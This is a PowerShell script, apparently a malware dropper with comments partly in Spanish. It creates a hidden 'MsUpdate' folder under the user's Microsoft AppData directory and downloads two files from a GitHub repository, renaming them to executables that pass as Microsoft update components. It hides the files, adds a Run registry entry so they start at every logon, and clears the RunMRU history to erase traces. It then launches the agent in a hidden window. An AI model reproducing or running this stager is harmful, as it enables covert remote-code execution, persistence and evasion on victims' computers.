## Create directory
$UserProfile = [System.Environment]::GetFolderPath("UserProfile")
$MsRdpNetPath = Join-Path $UserProfile "AppData\Local\Microsoft\MsUpdate"
if (-not (Test-Path -Path $MsRdpNetPath)) {
    $MsRdpNetFolder = New-Item -Path $MsRdpNetPath -ItemType Directory -Force 
    $MsRdpNetFolder.Attributes += "Hidden"
}

# Copy Agent
$rutaLocalAgent = "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\MsUpdate.exe"
$urlRemotoAgent = "https://github.com/andradecristian/varios/raw/main/AES.PY"
if (-not (Test-Path $rutaLocalAgent)) {
    Invoke-WebRequest -Uri $urlRemotoAgent -OutFile $rutaLocalAgent
}
if ((Get-Item $rutaLocalAgent).Name -ne "MsUpdate.exe") {
    $rutaNuevoNombreAgent = $rutaLocalAgent -replace 'AES.PY', 'MsUpdate.exe'
    Rename-Item -Path $rutaLocalAgent -NewName $rutaNuevoNombreAgent
}
$atributosOcultosAgent = (Get-Item $rutaLocalAgent).Attributes -bor [System.IO.FileAttributes]::Hidden
Set-ItemProperty -Path $rutaLocalAgent -Name Attributes -Value $atributosOcultosAgent

# Copy Ejecuter
$rutaLocalEjecuter = "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\SMSU.exe"
$urlRemotoEjecuter = "https://github.com/andradecristian/varios/raw/main/SMSU.PY"
if (-not (Test-Path $rutaLocalEjecuter)) {
    Invoke-WebRequest -Uri $urlRemotoEjecuter -OutFile $rutaLocalEjecuter
}
if ((Get-Item $rutaLocalEjecuter).Name -ne "SMSU.exe") {
    $rutaNuevoNombreEjecuter = $rutaLocalEjecuter -replace 'SMSU.PY', 'SMSU.exe'
    Rename-Item -Path $rutaLocalEjecuter -NewName $rutaNuevoNombreEjecuter
}
$atributosOcultosEjecuter = (Get-Item $rutaLocalEjecuter).Attributes -bor [System.IO.FileAttributes]::Hidden
Set-ItemProperty -Path $rutaLocalEjecuter -Name Attributes -Value $atributosOcultosEjecuter

# Registry path for the startup entries
$rutaRegistro = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$nombreEntrada = "MsUpdate"
if (-not (Test-Path "$rutaRegistro\$nombreEntrada")) {
    $valorEntrada = "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\SMSU.exe"
    $null = New-ItemProperty -Path $rutaRegistro -Name $nombreEntrada -Value $valorEntrada -PropertyType String -Force
}

### Prcesos en memoria para evair
#$url = "https://www.youtube.com/watch?v=P5mtclwloEQ"
#Start-Process $url

# Limpiar historial de ejecucion
$registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
Remove-Item -LiteralPath $registryPath -Force

## Execution of the client
Start-Process -FilePath "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\MsUpdate.exe" -ArgumentList "start" -WindowStyle Hidden

##Lock Windows
#Start-Process rundll32.exe -ArgumentList 'user32.dll,LockWorkStation' -NoNewWindow -Wait


